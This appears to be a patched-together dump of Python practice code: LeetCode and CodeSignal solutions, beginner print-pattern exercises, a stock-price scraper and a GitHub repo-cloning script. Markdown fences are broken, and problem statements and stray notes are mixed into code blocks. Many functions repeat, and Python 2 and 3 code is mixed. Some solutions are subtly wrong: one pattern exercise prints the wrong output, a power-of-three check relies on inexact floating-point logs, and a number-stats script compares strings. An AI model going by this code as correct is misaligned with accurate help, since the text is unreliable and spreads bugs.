                break
            i -= 1
        if i == 0:
            self.reverse(0, n - 1, nums)
        else:
            j = n - 1
            target = nums[i - 1]
            while j > i - 1:
                if nums[j] > target:
                    break
                j -= 1
            nums[i - 1], nums[j] = nums[j], nums[i - 1]
            self.reverse(i, n - 1, nums)

    def reverse(self, l, r, nums):
        if r < l:
            return
        nums[l], nums[r] = nums[r], nums[l]
        self.reverse(l + 1, r - 1, nums)

class Solution:
    def findMinHeightTrees(self, n: int, edges: List[List[int]]) -> List[int]:
        if n == 1:
            return [0]

        link = {i: set() for i in range(n)}
        for edge in edges:
            x, y = edge[0], edge[1]
            link[x].add(y)
            link[y].add(x)
        leaves = [k for k, v in link.items() if len(v) == 1]
        while n > 2:
            n -= len(leaves)
            new_leaves = []
            for leaf in leaves:
                k = link[leaf].pop()
                del link[leaf]
                link[k].remove(leaf)
                if len(link[k]) == 1:
                    new_leaves.append(k)
            leaves = new_leaves
        return leaves

class Solution:
    def multiply(self, A: List[List[int]], B: List[List[int]]) -> List[List[int]]:
        rows, n, cols = len(A), len(A[0]), len(B[0])
        C = [[0] * cols for _ in range(rows)]
        for i in range(rows):
            for j in range(n):
                if A[i][j] != 0:
                    for z in range(cols):
                        if B[j][z] != 0:
                            C[i][z] += A[i][j] * B[j][z]
        return C

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
from collections import defaultdict


class Solution:
    def verticalOrder(self, root: TreeNode) -> List[List[int]]:
        if not root:
            return []
        d = defaultdict(list)
        queue = [(root, 0)]
        while queue:
            new_queue = []
            for node, x in queue:
                d[x].append(node.val)
                if node.left:
                    new_queue.append((node.left, x - 1))
                if node.right:
                    new_queue.append((node.right, x + 1))
            queue = new_queue
        return [d[k] for k in sorted(d)]

class Solution:
    def removeDuplicateLetters(self, s):
        """
        :type s: str
        :rtype: str
        """
        if not s or len(s) < 2:
            return s
        count = [0] * 26
        for c in s:
            count[ord(c) - ord("a")] += 1
        start = 0
        for i in range(len(s)):
            if ord(s[i]) < ord(s[start]):
                start = i
            count[ord(s[i]) - ord("a")] -= 1
            if count[ord(s[i]) - ord("a")] == 0:
                break
        return s[start] + self.removeDuplicateLetters(
            s[start + 1 :].replace(s[start], "")
        )

def depositProfit(deposit, rate, threshold):
    year = 0
    while deposit < threshold:
        deposit *= 1 + (rate / 100)
        year += 1
    return year

def absoluteValuesSumMinimization(a):
    sums = []
    for i in range(len(a)):
        sum = 0
        for j in range(len(a)):
            sum += abs(a[i] - a[j])
        sums.append(sum)
    return a[sums.index(min(sums))]

class Solution(object):
    def longestValidParentheses(self, s):
        """
        :type s: str
        :rtype: int
        """
        stack, result = [-1], 0

        for index in range(len(s)):
            if s[index] == "(":
                stack.append(index)
            else:
                currIndex = stack.pop()
                if currIndex == -1:
                    stack.append(index)
                else:
                    result = max(result, index - currIndex + 1)
        return result
````

````py
time: O(N*K)
space: O(N)```


```py


class Solution:
    def coinChange(self, coins: List[int], amount: int) -> int:
        dp = [amount + 1] * (amount + 1)
        dp[0] = 0

        for i in range(1, amount + 1):
            for coin in coins:
                if i - coin < 0:
                    continue
                dp[i] = min(dp[i], 1 + dp[i - coin])
        return -1 if dp[amount] == amount + 1 else dp[amount]

class Solution:
    def countComponents(self, n: int, edges: List[List[int]]) -> int:
        count = n
        roots = list(range(n))

        def find(node):
            root = node
            while roots[root] != root:
                root = roots[root]
            while node != root:
                roots[node], node = root, roots[node]
            return root

        def union(x, y):
            roots[x] = y

        for edge in edges:
            x, y = find(edge[0]), find(edge[1])
            if x != y:
                union(x, y)
                count -= 1
        return count

class Solution:
    def maxSubArrayLen(self, nums, k):
        """
        :type nums: List[int]
        :type k: int
        :rtype: int
        """
        sum, ret = 0, 0
        map = {}
        for i in range(len(nums)):
            sum += nums[i]
            if sum == k:
                ret = i + 1
            elif sum - k in map:
                ret = max(i - map[sum - k], ret)
            if sum not in map:
                map[sum] = i
        return ret
````

````py
 Given an integer, write a function to determine if it is a power of three.

 Follow up:
 Could you do it without using any loop / recursion?```


```py


class Solution(object):
    def isPowerOfThree(self, n):
        """
        :type n: int
        :rtype: bool
        """
        if n <= 0:
            return False

        import math

        return (math.log10(n) / math.log10(3)) % 1 == 0
````

````py
 Given a singly linked list, group all odd nodes together followed by the even nodes. Please note here we are talking about the node number and not the value in the nodes.

 You should try to do it in place. The program should run in O(1) space complexity and O(nodes) time complexity.

 Example:
 Given 1->2->3->4->5->NULL,
 return 1->3->5->2->4->NULL.```


```py

# Definition for singly-linked list.
# class ListNode(object):
#     def __init__(self, x):
#         self.val = x
#         self.next = None


class Solution(object):
    def oddEvenList(self, head):
        """
        :type head: ListNode
        :rtype: ListNode
        """
        if not head:
            return None

        odd, even = head, head.next
        evenHead = even
        while even and even.next:
            odd.next = even.next
            odd = odd.next
            even.next = odd.next
            even = even.next

        odd.next = evenHead
        return head

def absoluteValuesSumMinimization(a):
    sums = {}
    for num in a:
        total = sum([abs(a[i] - num) for i in range(len(a))])
        if total in sums:
            sums[total] = min(num, sums[total])
        else:
            sums[total] = num
        print(sums)
    return sums[min(sums)]

import urllib.request
from bs4 import BeautifulSoup


def get_stock_tickers():
    req = urllib.request.Request(
        "http://en.wikipedia.org/wiki/List_of_S%26P_500_companies"
    )
    page = urllib.request.urlopen(req)
    soup = BeautifulSoup(page, "html.parser")
    table = soup.find("table", {"class": "wikitable sortable"})
    tickers = []
    for row in table.findAll("tr"):
        col = row.findAll("td")
        if len(col) > 0:
            tickers.append(str(col[0].string.strip()))
    tickers.sort()
    return tickers


def get_stock_prices(ticker_list):
    for ticker in ticker_list:
        htmlfile = urllib.request.urlopen(
            "http://finance.yahoo.com/q?s={0}".format(ticker)
        )
        htmltext = htmlfile.read()
        soup = BeautifulSoup(htmltext, "html.parser")
        htmlSelector = "yfs_l84_{0}".format(ticker.lower())
        for price in soup.find_all(id=htmlSelector):
            print("{0} is {1}".format(ticker, price.text))


def main():
    all_tickers = get_stock_tickers()
    get_stock_prices(all_tickers)


if __name__ == "__main__":
    main()
````

```py
32) b) Write a Python Program to print the following format

1
22
333
4444
55555
```

```py

for i in range(1, 6):
    for j in range(1, i + 1):
        print(i, end="")
    print()
```

```py
32) c) Write a Python Program to print the following format

*
**
***
****
*****
```

```py


for i in range(1, 6):
    for j in range(1, i + 1):
        print("*", end="")
    print()
```

```py
32) d) Write a Python Program to print the following format


54321
5432
543
54
5
```

```py

num = 5

for i in range(num, 0, -1):
    for j in range(0, i):
        print(num, end="")
    num -= 1
    print()
```

```py
32) e) Write a Python Program to print the following format


55555
4444
333
22
1
```

```py

num = 5

for i in range(num, 0, -1):
    for j in range(0, i):
        print(num, end="")
    num -= 1
    print()
```

```py
32) a) Write a Python Program to print the following format

1
12
123
1234
12345
```

```py

for i in range(1, 6):
    for j in range(1, i + 1):

        print(j, end="")

    print()

import itertools


def stringsRearrangement(inputArray):
    permutations = itertools.permutations(inputArray)
    for array in permutations:
        if testArrangement(array):
            return True
    return False


def testArrangement(array):
    for i in range(len(array) - 1):
        if sum([a != b for a, b in zip(array[i], array[i + 1])]) != 1:
            return False
    return True

from collections import defaultdict


class Solution:
    def findItinerary(self, tickets: List[List[str]]) -> List[str]:
        result = []
        airports = defaultdict(deque)
        tickets = sorted(tickets, reverse=True)
        for ticket in tickets:
            airports[ticket[0]].append(ticket[1])
        stack, result = ["JFK"], []
        while stack:
            while airports[stack[-1]]:
                stack.append(airports[stack[-1]].pop())
            result.append(stack.pop())
        return result[::-1]
```

````py
 Given an unsorted array return whether an increasing subsequence of length 3 exists or not in the array.

 Formally the function should:
 Return true if there exists i, j, k
 such that arr[i] < arr[j] < arr[k] given 0 ≤ i < j < k ≤ n-1 else return false.
 Your algorithm should run in O(n) time complexity and O(1) space complexity.

 Examples:
 Given [1, 2, 3, 4, 5],
 return true.

 Given [5, 4, 3, 2, 1],
 return false.```


```py


class Solution(object):
    def increasingTriplet(self, nums):
        """
        :type nums: List[int]
        :rtype: bool
        """

        first, second = float("inf"), float("inf")
        for val in nums:
            if val <= first:
                first = val
            elif val <= second:
                second = val
            else:
                return True

        return False

class Solution:
    def palindromePairs(self, words):
        """
        :type words: List[str]
        :rtype: List[List[int]]
        """
        lookup = {w: i for i, w in enumerate(words)}
        result = []
        for i, w in enumerate(words):
            for j in range(len(w) + 1):
                pre, pos = w[:j], w[j:]
                if (
                    j != 0
                    and pre == pre[::-1]
                    and pos[::-1] != w
                    and pos[::-1] in lookup
                ):
                    result.append([lookup[pos[::-1]], i])
                if pos == pos[::-1] and pre[::-1] != w and pre[::-1] in lookup:
                    result.append([i, lookup[pre[::-1]]])
        return result

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def rob(self, root: TreeNode) -> int:
        def dfs(node):
            if not node:
                return (0, 0)
            left, right = dfs(node.left), dfs(node.right)
            s1, s2 = node.val + left[0] + right[0], max(left) + max(right)
            return (s2, s1)

        return max(dfs(root))

class Solution:
    def countBits(self, num):
        """
        :type num: int
        :rtype: List[int]
        """
        ret = [0] * (num + 1)
        for i in range(1, num + 1):
            ret[i] = ret[i >> 1] + i % 2
        return ret

import itertools


def stringsRearrangement(inputArray):
    permutations = itertools.permutations(inputArray)
    for array in permutations:
        if testArrangement(array):
            return True
    return False


def testArrangement(array):
    for i in range(len(array) - 1):
        if sum([a != b for a, b in zip(array[i], array[i + 1])]) != 1:
            return False
    return True

def extractEachKth(inputArray, k):
    return [inputArray[x] for x in range(len(inputArray)) if (x + 1) % k != 0]

class Solution:
    def searchRange(self, nums, target):
        """
        :type nums: List[int]
        :type target: int
        :rtype: List[int]
        """
        if not nums or len(nums) == 0:
            return [-1, -1]

        def findGreater(t):
            l, r = 0, len(nums) - 1
            while l <= r:
                m = l + (r - l) // 2
                if nums[m] < t:
                    l = m + 1
                else:
                    r = m - 1
            return l

        left = findGreater(target)
        right = findGreater(target + 1) - 1
        return [left, right] if right >= left else [-1, -1]

class Solution:
    def lengthOfLongestSubstringKDistinct(self, s: str, k: int) -> int:
        count = 0
        start, end = 0, 0
        result = 0
        d = {}
        while end < len(s):
            c = s[end]
            d[c] = d.get(c, 0) + 1
            if d[c] == 1:
                count += 1
            end += 1
            while count > k and start < len(s):
                curr = s[start]
                if curr in d:
                    d[curr] -= 1
                    if d[curr] == 0:
                        count -= 1
                start += 1
            result = max(result, end - start)
        return result

class Solution:
    def isPowerOfFour(self, num: int) -> bool:
        return num & (num - 1) == 0 and (num - 1) % 3 == 0

from typing import List


class Solution:
    def reverseString(self, s: List[str]) -> None:
        """
        Do not return anything, modify s in-place instead.
        """
        left, right = 0, len(s) - 1
        while left < right:
            s[left], s[right] = s[right], s[left]
            left += 1
            right -= 1

from collections import deque


class MovingAverage:
    def __init__(self, size: int):
        """
        Initialize your data structure here.
        """
        self.size = size
        self.window = deque()

    def next(self, val: int) -> float:
        self.window.append(val)
        if len(self.window) > self.size:
            self.window.popleft()
        return sum(self.window) / len(self.window)


# Your MovingAverage object will be instantiated and called as such:
# obj = MovingAverage(size)
# param_1 = obj.next(val)

from collections import Counter, defaultdict


class Solution(object):
    def topKFrequent(self, nums, k):
        """
        :type nums: List[int]
        :type k: int
        :rtype: List[int]
        """
        counter = defaultdict(list)
        for key, val in Counter(nums).items():
            counter[val].append(key)

        result = []
        for i in range(len(nums), 0, -1):
            result.extend(counter[i])
            if len(result) >= k:
                return result[:k]
        return result[:k]

class Solution:
    def intersection(self, nums1: List[int], nums2: List[int]) -> List[int]:
        result = []
        nums1 = set(nums1)
        for num in nums2:
            if num in nums1 and not num in result:
                result.append(num)
        return result

def extractEachKth(inputArray, k):
    return [inputArray[x] for x in range(len(inputArray)) if (x + 1) % k != 0]

import sys
import os
import requests


def get_total_repos(group, name):
    repo_urls = []
    page = 1
    while True:
        url = "https://api.github.com/{0}/{1}/repos?per_page=100&page={2}"
        r = requests.get(url.format(group, name, page))
        if r.status_code == 200:
            rdata = r.json()
            for repo in rdata:
                repo_urls.append(repo["clone_url"])
            if len(rdata) >= 100:
                page += 1
            else:
                print("Found {0} repos.".format(len(repo_urls)))
                break
        else:
            print(r)
            return False
    return repo_urls


def clone_repos(all_repos):
    count = 1
    print("Cloning...")
    for repo in all_repos:
        os.system("Git clone " + repo)
        print("Completed repo #{0} of {1}".format(count, len(all_repos)))
        count += 1


if __name__ == "__main__":
    if len(sys.argv) > 2:
        total = get_total_repos(sys.argv[1], sys.argv[2])
        if total:
            clone_repos(total)

    else:
        print("Usage: python USERS_OR_ORG GITHUB_USER_OR_ORG-NAME")

# Time: logN
class Solution:
    def searchInsert(self, nums: List[int], target: int) -> int:
        if not nums or target < nums[0]:
            return 0
        if nums[-1] < target:
            return len(nums)
        l, r = 0, len(nums) - 1
        while l <= r:
            m = l + (r - l) // 2
            if nums[m] == target:
                return m
            if nums[m] > target:
                r = m - 1
            else:
                l = m + 1
        return l

from collections import Counter

## This problem can be solved with
## (1) Two pointers by sorting two lists
## (2) Hash Table
class Solution:
    def intersect(self, nums1: List[int], nums2: List[int]) -> List[int]:
        result = []
        count1 = Counter(nums1)
        for n in nums2:
            if n in count1 and count1[n] > 0:
                count1[n] -= 1
                result.append(n)
        return result

# Time: O(n)
# Space: O(n)
class Solution:
    def numberOfPatterns(self, m: int, n: int) -> int:
        skip = {
            (1, 3): 2,
            (1, 7): 4,
            (1, 9): 5,
            (2, 8): 5,
            (3, 7): 5,
            (3, 9): 6,
            (4, 6): 5,
            (7, 9): 8,
        }
        result = 0

        def dfs(visited, last):
            nonlocal result
            if m <= len(visited) <= n:
                result += 1
            if len(visited) > n:
                return
            for num in range(1, 10):
                if num not in visited:
                    edge = (min(num, last), max(num, last))
                    if edge not in skip or skip[edge] in visited:
                        dfs(visited | {num}, num)

        dfs({1}, 1)
        dfs({2}, 2)
        result *= 4
        dfs({5}, 5)
        return result

class Solution:
    def maxEnvelopes(self, envelopes: List[List[int]]) -> int:
        N = len(envelopes)
        envelopes.sort(key=lambda x: (x[0], -x[1]))
        tail = [0] * N
        result = 0

        for e in envelopes:
            i, j = 0, result
            while i != j:
                m = i + (j - i) // 2
                if e[1] > tail[m]:
                    i = m + 1
                else:
                    j = m
            tail[i] = e[1]
            result = max(result, i + 1)
        return result

import heapq
from collections import Counter


class Solution:
    def rearrangeString(self, s, k):
        """
        :type s: str
        :type k: int
        :rtype: str
        """
        if k == 0:
            return s
        l = [(-count, c) for c, count in Counter(s).items()]
        heapq.heapify(l)
        result = ""
        while l:
            q = []
            for _ in range(k):
                if not l:
                    return ""
                count, c = heapq.heappop(l)
                result += c
                if count + 1 < 0:
                    q.append((count + 1, c))
                if len(result) == len(s):
                    return result
            while q:
                heapq.heappush(l, q.pop())
        return result if len(result) == len(s) else ""

class Logger:
    def __init__(self):
        """
        Initialize your data structure here.
        """
        self.logger = {}

    def shouldPrintMessage(self, timestamp: int, message: str) -> bool:
        """
        Returns true if the message should be printed in the given timestamp, otherwise returns false.
        If this method returns false, the message will not be printed.
        The timestamp is in seconds granularity.
        """
        if message not in self.logger:
            self.logger[message] = timestamp + 10
            return True
        elif timestamp < self.logger[message]:
            return False
        else:
            self.logger[message] = timestamp + 10
            return True


# Your Logger object will be instantiated and called as such:
# obj = Logger()
# param_1 = obj.shouldPrintMessage(timestamp,message)

class Solution:
    def isValidSudoku(self, board: List[List[str]]) -> bool:
        for row in board:
            if not self.isValid(row):
                return False
        for col in zip(*board):
            if not self.isValid(col):
                return False
        for i in [0, 3, 6]:
            for j in [0, 3, 6]:
                block = [board[x][y] for x in range(i, i + 3) for y in range(j, j + 3)]
                if not self.isValid(block):
                    return False
        return True

    def isValid(self, data):
        data = [int(item) for item in data if item != "."]
        return len(set(data)) == len(data)

class HitCounter:
    def __init__(self):
        """
        Initialize your data structure here.
        """
        self.counter = [[0, t + 1] for t in range(300)]

    def hit(self, timestamp: int) -> None:
        """
        Record a hit.
        @param timestamp - The current timestamp (in seconds granularity).
        """
        i = (timestamp - 1) % 300
        if self.counter[i][1] == timestamp:
            self.counter[i][0] += 1
        else:
            self.counter[i] = [1, timestamp]

    def getHits(self, timestamp: int) -> int:
        """
        Return the number of hits in the past 5 minutes.
        @param timestamp - The current timestamp (in seconds granularity).
        """
        count = 0
        for c in self.counter:
            if timestamp - c[1] < 300:
                count += c[0]
        return count

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, val=0, left=None, right=None):
#         self.val = val
#         self.left = left
#         self.right = right
class Solution:
    def findLeaves(self, root: TreeNode) -> List[List[int]]:
        result = []

        def dfs(node):
            if not node:
                return 0
            height = max(dfs(node.left), dfs(node.right)) + 1
            if height > len(result):
                result.append([])
            result[height - 1].append(node.val)
            return height

        dfs(root)
        return result

def arrayMaxConsecutiveSum(inputArray, k):
    sums = [sum(inputArray[:k])]
    for i in range(1, len(inputArray) - k + 1):
        sums.append(sums[i - 1] - inputArray[i - 1] + inputArray[i + k - 1])
    return max(sums)

# The guess API is already defined for you.
# @param num, your guess
# @return -1 if my number is lower, 1 if my number is higher, otherwise return 0
# def guess(num: int) -> int:


class Solution:
    def guessNumber(self, n: int) -> int:
        l, r = 1, n
        while l <= r:
            m = l + (r - l) // 2
            g = guess(m)
            if g == 0:
                return m
            elif g == 1:
                l = m + 1
            else:
                r = m - 1
        return l

class Solution:
    def combinationSum4(self, nums, target):
        """
        :type nums: List[int]
        :type target: int
        :rtype: int
        """
        if not nums:
            return 0
        dp = [0] * (target + 1)
        dp[0] = 1
        for i in range(1, target + 1):
            for num in nums:
                if i >= num:
                    dp[i] += dp[i - num]
        return dp[target]

import heapq
from typing import List

# Time: klogk


class Solution:
    def kthSmallest(self, matrix: List[List[int]], k: int) -> int:
        if not matrix or len(matrix) == 0:
            return None
        n = len(matrix)
        q = [(matrix[0][0], 0, 0)]
        used = {0}
        xx, yy = [1, 0], [0, 1]
        result = None
        while k > 0:
            result, x, y = heapq.heappop(q)
            for i in range(2):
                next_x, next_y = x + xx[i], y + yy[i]
                index = next_x * n + next_y
                if next_x < n and next_y < n and not index in used:
                    heapq.heappush(q, (matrix[next_x][next_y], next_x, next_y))
                    used.add(index)
            k -= 1
        return result

def arrayMaxConsecutiveSum(inputArray, k):
    sums = [sum(inputArray[:k])]
    for i in range(1, len(inputArray) - k + 1):
        sums.append(sums[i - 1] - inputArray[i - 1] + inputArray[i + k - 1])
    return max(sums)

def growingPlant(upSpeed, downSpeed, desiredHeight):
    height = 0
    days = 1
    height += upSpeed
    while height < desiredHeight:
        days += 1
        height -= downSpeed
        height += upSpeed
    return days

import collections


class Solution:
    def firstUniqChar(self, s):
        """
        :type s: str
        :rtype: int
        """
        n = len(s)
        if n == 1:
            return 0
        d = collections.Counter(s)
        for i in range(n):
            if d[s[i]] == 1:
                return i
        return -1

class Solution:
    def findTheDifference(self, s: str, t: str) -> str:
        d = Counter(s)
        for c in t:
            if c not in d or d[c] == 0:
                return c
            d[c] -= 1
        return -1

def growingPlant(upSpeed, downSpeed, desiredHeight):
    height = 0
    days = 1
    height += upSpeed
    while height < desiredHeight:
        days += 1
        height -= downSpeed
        height += upSpeed
    return days

def knapsackLight(value1, weight1, value2, weight2, maxW):
    if weight1 + weight2 <= maxW:
        return value1 + value2
    if weight1 <= maxW and (weight2 > maxW or value1 >= value2):
        return value1
    if weight2 <= maxW and (weight1 > maxW or value2 >= value1):
        return value2
    return 0

# Time Complexity: O(N^target)
# Space Complexity:


class Solution:
    def combinationSum(self, candidates: List[int], target: int) -> List[List[int]]:
        result = []
        candidates.sort()
        self.search(candidates, target, [], result)
        return result

    def search(self, candidates, target, path, result):
        if target == 0:
            result.append(list(path))
            return
        for i in range(len(candidates)):
            if target - candidates[i] < 0:
                break
            self.search(
                candidates[i:], target - candidates[i], path + [candidates[i]], result
            )

class Solution:
    def isRectangleCover(self, rectangles: List[List[int]]) -> bool:
        s, area = set(), 0
        x1, y1, x2, y2 = float("inf"), float("inf"), float("-inf"), float("-inf")

        for rectangle in rectangles:
            s1, s2, s3, s4 = rectangle[0], rectangle[1], rectangle[2], rectangle[3]
            x1, y1 = min(x1, s1), min(y1, s2)
            x2, y2 = max(x2, s3), max(y2, s4)

            area += (s3 - s1) * (s4 - s2)

            if (s1, s2) in s:
                s -= {(s1, s2)}
            else:
                s.add((s1, s2))

            if (s1, s4) in s:
                s -= {(s1, s4)}
            else:
                s.add((s1, s4))

            if (s3, s4) in s:
                s -= {(s3, s4)}
            else:
                s.add((s3, s4))

            if (s3, s2) in s:
                s -= {(s3, s2)}
            else:
                s.add((s3, s2))

        if (
            (x1, y1) not in s
            or (x1, y2) not in s
            or (x2, y2) not in s
            or (x2, y1) not in s
            or len(s) != 4
        ):
            return False
        return area == (x2 - x1) * (y2 - y1)

class Solution:
    def isSubsequence(self, s: str, t: str) -> bool:
        d = {}
        for i, c in enumerate(t):
            d[c] = d.get(c, []) + [i]
        prev_idx = 0
        for c in s:
            if c not in d:
                return False
            idx = bisect.bisect_left(d[c], prev_idx)
            if idx == len(d[c]):
                return False
            prev_idx = d[c][idx] + 1
        return True
````

````py
    Find the length of the longest substring T of a given string (consists of lowercase letters only) such that every character in T appears no less than k times.

    Example 1:

    Input:
    s = "aaabb", k = 3

    Output:
    3

    The longest substring is "aaa", as 'a' is repeated 3 times.
    Example 2:

    Input:
    s = "ababbc", k = 2

    Output:
    5

    The longest substring is "ababb", as 'a' is repeated 2 times and 'b' is repeated 3 times.```


```py


class Solution(object):
    def longestSubstring(self, s, k):
        """
        :type s: str
        :type k: int
        :rtype: int
        """
        dict = {}
        for c in s:
            if c not in dict:
                dict[c] = 0
            dict[c] += 1
        if all(dict[i] >= k for i in dict):
            return len(s)

        longest = 0
        start = 0
        for i in range(len(s)):
            c = s[i]
            if dict[c] < k:
                longest = max(longest, self.longestSubstring(s[start:i], k))
                start = i + 1

        return max(longest, self.longestSubstring(s[start:], k))

class Solution:
    def __init__(self, nums: List[int]):
        self.d = {}
        for i, v in enumerate(nums):
            self.d[v] = self.d.get(v, []) + [i]

    def pick(self, target: int) -> int:
        n = len(self.d[target])
        return self.d[target][random.randint(0, n - 1)]


# Your Solution object will be instantiated and called as such:
# obj = Solution(nums)
# param_1 = obj.pick(target)

from collections import defaultdict, deque
from typing import List


class Solution:
    def calcEquation(
        self, equations: List[List[str]], values: List[float], queries: List[List[str]]
    ) -> List[float]:
        graph = defaultdict(dict)
        for link, value in zip(equations, values):
            graph[link[0]][link[1]] = value
            graph[link[1]][link[0]] = 1 / value

        def answerQuery(s, e):
            if s not in graph or e not in graph:
                return -1.0
            if e == s:
                return 1.0
            q = deque([(s, 1.0)])
            visited = {s}
            while q:
                curr, val = q.popleft()
                for child in graph[curr]:
                    if child in visited:
                        continue
                    accumulated_val = val * graph[curr][child]
                    if child == e:
                        return accumulated_val
                    graph[s][child] = accumulated_val
                    graph[child][s] = 1 / accumulated_val
                    q.append((child, accumulated_val))
            return -1.0

        return [answerQuery(x, y) for (x, y) in queries]

def knapsackLight(value1, weight1, value2, weight2, maxW):
    if weight1 + weight2 <= maxW:
        return value1 + value2
    if weight1 <= maxW and (weight2 > maxW or value1 >= value2):
        return value1
    if weight2 <= maxW and (weight1 > maxW or value2 >= value1):
        return value2
    return 0

class Solution:
    # @param A : list of integers
    # @param B : integer
    # @return an integer
    def threeSumClosest(self, A, B):
        A.sort()
        cs = math.inf
        for i in range(0, len(A) - 2):
            j = i + 1
            k = len(A) - 1
            while j < k:
                s = A[i] + A[j] + A[k]
                if s == B:
                    return s
                if abs(B - s) < cs:
                    cs = abs(B - s)
                    res = s
                if s <= B:
                    j += 1
                else:
                    k -= 1
        return res

# 3.Write a Python program to find sum of two numbers taking as a input

x = input("Enter the first number: ")
y = input("Enter the second number: ")

result = float(x) + float(y)

print("The sum of the two numbers is : {}".format(result))

l = [8, 2, 5, 4, 1, 3]

print(l)
# Implement an insertion sort algorithm
def insertion_sort(list_to_sort):
    # seperate the first element and think of it as sorted

    # for all other items, starting at second index (1)
    for i in range(1, len(list_to_sort)):
        # put the current number in to a temp variable
        temp = list_to_sort[i]
        j = i
        # keep looking left, until we find where it belongs
        while j > 0 and temp < list_to_sort[j - 1]:
            # as we look left shift the items to the right as we iterate
            list_to_sort[j] = list_to_sort[j - 1]
            j -= 1
        # when left is smaller than temp, or we are at zero, put item at this spot
        list_to_sort[j] = temp

    return list_to_sort


insertion_sort(l)

print(l)

# -*- coding: utf-8 -*-```


```py
Michael Galarnyk

Given the following python statement…
avg_str = 'Average value read: 0.72903'
Use the find() method and string slicing
to extract the potion of the string after
the colon character and then use the float()
function to convert the extracted string
into a floating point value. Save your code
in a file named “parse_float.py”.```


```py

avg_str = "Average value read: 0.72903"
start_pos = avg_str.find(":")

# 1 more since start_po is after :
start_pos = start_pos + 1

# taking the number portion of the string
number_portion = avg_str[start_pos:]

# typecasting number_portion to float
number_portion = float(number_portion)

# -*- coding: utf-8 -*-```


```py
Michael Galarnyk

Write a program called “process_numbers.py”
that repeatedly reads numbers input by
the user until the user types “done”.
After the user has entered “done”,
print out the total, count, maximum,
 minimum, and average of the entered numbers.```


```py
user_input = ''
total = 0;
count = 0;
maximum = None;
minimum = None;
while (user_input != 'done'):
    user_input = raw_input('Enter a number or enter done\n');

    if user_input != 'done':
        total += float(user_input);
    if (user_input == 'done'):
        average = total / float(count);
        break;
    count += 1
    if maximum is None or user_input > maximum:
        maximum = user_input
    if minimum is None or user_input < minimum:
        minimum = user_input


print 'count: %d \n' %count
print 'average%g \n' %average
print 'maximum:%s \n' %maximum
print 'minimum:%s \n' %minimum

def longestDigitsPrefix(inputString):
    for char in range(len(inputString)):
        if not inputString[char].isdigit():
            return inputString[:char]
    return inputString

class Solution:
    def combinationSum2(self, candidates: List[int], target: int) -> List[List[int]]:
        result = []
        candidates.sort()
        self.search(candidates, target, result, [])
        return result

    def search(self, candidates, target, result, path):
        if target == 0:
            result.append(path)

        for i in range(len(candidates)):
            if i > 0 and candidates[i - 1] == candidates[i]:
                continue
            if target < candidates[i]:
                break
            self.search(
                candidates[i + 1 :],
                target - candidates[i],
                result,
                path + [candidates[i]],
            )

class Solution:
    def canCross(self, stones: List[int]) -> bool:
        last = stones[-1]
        visited, stones = set(), set(stones)

        stack = [(0, 0)]
        while stack:
            curr, jump = stack.pop()
            for j in [jump - 1, jump, jump + 1]:
                new = curr + j
                if j > 0 and new in stones and (new, j) not in visited:
                    if new == last:
                        return True
                    stack.append((new, j))
            visited.add((curr, jump))
        return False

# Definition for a binary tree node.
# class TreeNode:
#     def __init__(self, x):
#         self.val = x
#         self.left = None
#         self.right = None


class Solution:
    def sumOfLeftLeaves(self, root):
        """
        :type root: TreeNode
        :rtype: int
        """
        if not root:
            return 0
        if root.left and not root.left.left and not root.left.right:
            return root.left.val + self.sumOfLeftLeaves(root.right)
        return self.sumOfLeftLeaves(root.left) + self.sumOfLeftLeaves(root.right)


from collections import deque


class Solution:
    def sumOfLeftLeaves(self, root: TreeNode) -> int:
        if not root:
            return 0
        q, result = deque([root]), 0
        while q:
            curr = q.popleft()
            if curr.left:
                if not curr.left.left and not curr.left.right:
                    result += curr.left.val
                q.append(curr.left)
            if curr.right:
                q.append(curr.right)

        return result

import heapq


class Solution:
    def trapRainWater(self, heights: "List[List[int]]") -> "int":
        if not heights or len(heights[0]) == 0:
            return 0
        result, q = 0, []
        m, n = len(heights), len(heights[0])
        visited = [[0 for j in range(n)] for i in range(m)]
        for i in [0, m - 1]:
            for j in range(n):
                if not visited[i][j]:
                    heapq.heappush(q, (heights[i][j], i, j))
                    visited[i][j] = 1
        for j in [0, n - 1]:
            for i in range(m):
                if not visited[i][j]:
                    heapq.heappush(q, (heights[i][j], i, j))
                    visited[i][j] = 1
        dx, dy = [0, 0, -1, 1], [1, -1, 0, 0]
        while q:
            curr, x, y = heapq.heappop(q)
            for i in range(4):
                nx, ny = x + dx[i], y + dy[i]
                if 0 <= nx < m and 0 <= ny < n and not visited[nx][ny]:
                    visited[nx][ny] = 1
                    result += max(0, curr - heights[nx][ny])
                    heapq.heappush(q, (max(curr, heights[nx][ny]), nx, ny))
        return result

class Solution:
    def longestPalindrome(self, s: str) -> int:
        check_even = {}
        for c in s:
            if c not in check_even:
                check_even[c] = 0
            else:
                del check_even[c]
        return len(s) - len(check_even) + 1 if check_even else len(s)

def longestDigitsPrefix(inputString):
    for char in range(len(inputString)):
        if not inputString[char].isdigit():
            return inputString[:char]
    return inputString

def digitDegree(n):
    degree = 0
    while 10 <= n:
        num = str(n)
        n = sum(int(i) for i in num)
        degree += 1
    return degree

class Solution:
    def firstMissingPositive(self, nums: List[int]) -> int:
        if not nums or len(nums) == 0:
            return 1
        for i in range(len(nums)):
            target = nums[i]
            while target > 0 and target <= len(nums) and nums[target - 1] != target:
                nums[target - 1], target = target, nums[target - 1]

        for i in range(len(nums)):
            if nums[i] != i + 1:
                return i + 1
        return len(nums) + 1


# class Solution:
#     def firstMissingPositive(self, nums):
#         """
#         :type nums: List[int]
#         :rtype: int
#         """
#
#         if not nums or len(nums) == 0:
#             return 1
#         ret = 1
#         nums = set(nums)
#         while True:
#             if ret in nums:
#                 ret += 1
#             else:
#                 return ret

class Solution:
    def fizzBuzz(self, n: int) -> List[str]:
        result = []
        for i in range(1, n + 1):
            if i % 3 == 0 and i % 5 == 0:
                result.append("FizzBuzz")
            elif i % 3 == 0:
                result.append("Fizz")
            elif i % 5 == 0:
                result.append("Buzz")
            else:
                result.append(str(i))
        return result

class Solution:
    def numberOfArithmeticSlices(self, A):
        """
        :type A: List[int]
        :rtype: int
        """
        result, curr = 0, 0
        for i in range(2, len(A)):
            if A[i] - A[i - 1] == A[i - 1] - A[i - 2]:
                curr += 1
